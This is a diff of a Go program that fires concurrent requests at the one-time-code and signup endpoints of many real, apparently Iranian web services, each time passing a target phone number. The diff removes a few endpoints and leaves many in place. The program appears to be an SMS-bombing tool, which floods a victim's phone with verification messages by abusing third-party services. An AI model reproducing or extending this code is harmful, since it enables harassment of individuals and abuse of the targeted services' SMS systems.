@@ -201,9 +201,6 @@ func main() {
 		go sms("https://dr-ross.ir/users/CheckRegisterMobile?returnUrl=%2F", map[string]interface{}{
 			"mobile": phone,
 		}, ch)   // add site
-		go sms("https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
-			"mobile": phone,
-		}, ch)   // add site
 		go sms("https://api.epasazh.com/api/v4/blind-otp", map[string]interface{}{
 			"mobile": phone,
 		}, ch)   // add site
@@ -243,9 +240,6 @@ func main() {
 		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
 			"contact": phone,
 		}, ch) 
-		go sms("https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
-			"phone_number": phone,
-		}, ch) 
 		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
 			"MobileNumber": phone,
 		}, ch) 
@@ -257,9 +251,6 @@ func main() {
 		}, ch) 
 		go sms("https://api.mobit.ir/api/web/v8/register/register", map[string]interface{}{
 			"number": phone,
-		}, ch) 
-		go sms("https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
-			"mobile": phone,
 		}, ch) 
 		go sms("https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{
 			"mobile": phone,
@@ -408,9 +399,6 @@ func main() {
 			"loginIdentifier": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://api.rokla.ir/user/request/otp/", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
